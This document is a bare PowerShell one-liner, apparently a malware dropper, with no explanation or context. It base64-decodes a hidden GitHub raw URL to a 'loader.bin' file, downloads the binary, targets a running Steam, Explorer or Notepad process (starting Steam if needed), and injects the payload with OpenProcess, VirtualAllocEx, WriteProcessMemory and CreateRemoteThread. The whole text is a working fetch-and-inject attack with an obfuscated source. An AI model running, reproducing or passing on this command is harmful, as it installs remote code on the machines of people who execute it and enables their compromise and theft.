$w=New-Object Net.WebClient;$b=[System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL3hla3plMDEwMi1hcnQvYjY0YS9yYXcvcmVmcy9oZWFkcy9tYWluL2xvYWRlci5iaW4=');$u=[System.Text.Encoding]::ASCII.GetString($b);$s=$w.DownloadData($u);$p=@(Get-Process|?{$_.ProcessName -in @('steam','explorer','notepad') -and $_.MainWindowHandle -ne 0})[0];if(!$p){$p=Start-Process 'steam' -PassThru;Start-Sleep 3};$asm=[System.AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('Sys')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('Inj',$false);$t=$asm.DefineType('Api','Public,Class');$m=$t.DefinePInvokeMethod('OpenProcess','kernel32','OpenProcess',[System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static,[System.Reflection.CallingConventions]::Standard,[IntPtr],[System.Type[]]@([UInt32],[Boolean],[Int32]),[System.Runtime.InteropServices.CallingConvention]::Winapi,[System.Runtime.InteropServices.CharSet]::Auto);$m.SetImplementationFlags(128);$m=$t.DefinePInvokeMethod('VirtualAllocEx','kernel32','VirtualAllocEx',[System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static,[System.Reflection.CallingConventions]::Standard,[IntPtr],[System.Type[]]@([IntPtr],[IntPtr],[UInt32],[UInt32],[UInt32]),[System.Runtime.InteropServices.CallingConvention]::Winapi,[System.Runtime.InteropServices.CharSet]::Auto);$m.SetImplementationFlags(128);$m=$t.DefinePInvokeMethod('WriteProcessMemory','kernel32','WriteProcessMemory',[System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static,[System.Reflection.CallingConventions]::Standard,[Boolean],[System.Type[]]@([IntPtr],[IntPtr],[Byte[]],[UInt32],[UIntPtr].MakeByRefType()),[System.Runtime.InteropServices.CallingConvention]::Winapi,[System.Runtime.InteropServices.CharSet]::Auto);$m.SetImplementationFlags(128);$m=$t.DefinePInvokeMethod('CreateRemoteThread','kernel32','CreateRemoteThread',[System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static,[System.Reflection.CallingConventions]::Standard,[IntPtr],[System.Type[]]@([IntPtr],[IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]),[System.Runtime.InteropServices.CallingConvention]::Winapi,[System.Runtime.InteropServices.CharSet]::Auto);$m.SetImplementationFlags(128);$a=$t.CreateType();$h=$a::OpenProcess(0x1F0FFF,$false,$p.Id);$m=$a::VirtualAllocEx($h,[IntPtr]::Zero,[UInt32]$s.Length,0x3000,0x40);$z=[UIntPtr]::Zero;$a::WriteProcessMemory($h,$m,$s,[UInt32]$s.Length,[Ref]$z);$th=$a::CreateRemoteThread($h,[IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[IntPtr]::Zero)
